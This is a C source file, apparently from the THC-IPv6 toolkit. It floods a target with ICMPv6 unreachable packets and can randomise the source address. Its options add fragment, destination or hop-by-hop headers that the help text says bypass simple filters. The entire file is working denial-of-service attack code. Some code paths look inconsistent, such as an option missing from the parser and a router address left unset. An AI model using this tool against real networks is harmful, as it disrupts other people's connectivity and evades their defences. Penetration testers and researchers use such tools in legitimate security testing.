#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

void help(char *prg) {
  printf("%s %s (c) 2020 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-HFD] [-p|-h] [-r|-R] interface target\n\n", prg);
  printf("Flood the target with ICMPv6 unreachable packets.\n");
  printf(
      "-F/-D/-H add fragment/destination/hopbyhop header to bypass simple "
      "filters\n");
  printf(
      "-p/-h    send port/host unreachable instead of network unreachable\n");
  printf("-r/-R    randomize source from /64 / randomize source completely\n");
  //  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  char *         interface, mac[6] = "", newroutermac[6];
  unsigned char *mac6 = mac;
  unsigned char  buf[1460], buf2[6], buf3[1504];
  unsigned char *dst = thc_resolve6("ff02::1"), *src = NULL, *fake_dst = NULL,
                *dstmac = NULL, *oldrouter = NULL, *newrouter = NULL;
  int i, j, k, type = NXT_ICMP6, offset = 14, rand_newrouter = 1, rand_src = 0,
               unreach = 0;
  unsigned char *pkt = NULL, *pkt2 = NULL;
  int pkt_len = 0, pkt_len2 = 0, rawmode = 0, count = 0, do_alert = 0,
      do_hop = 0, do_frag = 0, do_dst = 0;
  int           until = 0;
  thc_ipv6_hdr *hdr = NULL, *hdr2 = NULL;

  if (argc < 3) help(argv[0]);

  while ((i = getopt(argc, argv, "DFHphrR")) >= 0) {
    switch (i) {
      case 'p':
        unreach = 4;
        break;
      case 'h':
        unreach = 3;
        break;
      case 'r':
        rand_src = 1;
        break;
      case 'R':
        rand_src = 2;
        break;
      case 'F':
        do_frag++;
        break;
      case 'H':
        do_hop = 1;
        break;
      case 'a':
        do_alert = 1;
        do_hop = 1;
        break;
      case 'D':
        do_dst = 1;
        break;
      default:
        fprintf(stderr, "Error: invalid option %c\n", i);
        exit(-1);
    }
  }

  if (argc - optind < 1) help(argv[0]);

  srand(time(NULL) + getpid());
  setvbuf(stdout, NULL, _IONBF, 0);

  interface = argv[optind];
  dst = thc_resolve6(argv[optind + 1]);
  mac6 = thc_get_own_mac(interface);
  src = thc_get_own_ipv6(interface, dst, PREFER_GLOBAL);
  dstmac = thc_get_mac(interface, src, dst);

  if (mac6 == NULL) {
    fprintf(stderr, "Error: invalid interface %s\n", interface);
    exit(-1);
  }

  // we keep our real source in the packet to report as unreachable to allow
  // tracing misuse of the tool
  if ((pkt2 = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len2, dst,
                                       src, 0, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_udp(pkt2, &pkt_len2, 53, 53, 0, NULL, 0) < 0) return -1;
  thc_generate_pkt(interface, mac6, dstmac, pkt2, &pkt_len2);
  hdr = (thc_ipv6_hdr *)pkt2;

  if (do_hdr_size) offset = do_hdr_size;

  memset(buf3, 0, sizeof(buf3));
  memcpy(buf, hdr->pkt + offset, hdr->pkt_len - offset);
  j = hdr->pkt_len - offset;

  if (do_alert) {
    buf2[0] = 5;
    buf2[1] = 2;
  }

  printf(
      "Starting to flood with ICMPv6 unreachable on %s (Press Control-C to "
      "end, a dot is printed for every 1000 packets):\n",
      interface);
  while (until != 1) {
    if (rand_src > 0) {
      for (i = 0; i < 8; i++)
        src[8 + i] = rand() % 256;
      if (rand_src > 1)
        for (i = 1; i < 8; i++)
          src[i] = rand() % 256;
    }

    if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len, src,
                                        dst, 255, 0, 0, 0, 0)) == NULL)
      return -1;
    if (do_hop) {
      type = NXT_HBH;
      if (thc_add_hdr_hopbyhop(pkt, &pkt_len, buf2, sizeof(buf2)) < 0)
        return -1;
    }
    if (do_frag) {
      if (type == NXT_ICMP6) type = NXT_FRAG;
      for (i = 0; i < do_frag; i++)
        if (thc_add_hdr_oneshotfragment(pkt, &pkt_len, count + i) < 0)
          return -1;
    }
    if (do_dst) {
      if (type == NXT_ICMP6) type = NXT_DST;
      if (thc_add_hdr_dst(pkt, &pkt_len, buf3, sizeof(buf3)) < 0) return -1;
    }
    if (thc_add_icmp6(pkt, &pkt_len, ICMP6_UNREACH, unreach, 0, buf, j, 0) < 0)
      return -1;
    if (do_dst) {
      thc_generate_pkt(interface, mac6, dstmac, pkt, &pkt_len);
      hdr2 = (thc_ipv6_hdr *)pkt;
      thc_send_as_fragment6(interface, oldrouter, dst, type,
                            hdr2->pkt + 40 + offset,
                            hdr2->pkt_len - 40 - offset, 1240);
    } else {
      if (thc_generate_and_send_pkt(interface, mac6, dstmac, pkt, &pkt_len) <
          0) {
        printf("!");
      }
    }
    count++;

    pkt = thc_destroy_packet(pkt);
    if (count % 1000 == 0) printf(".");
    if (until > 1) until--;
  }

  return 0;
}
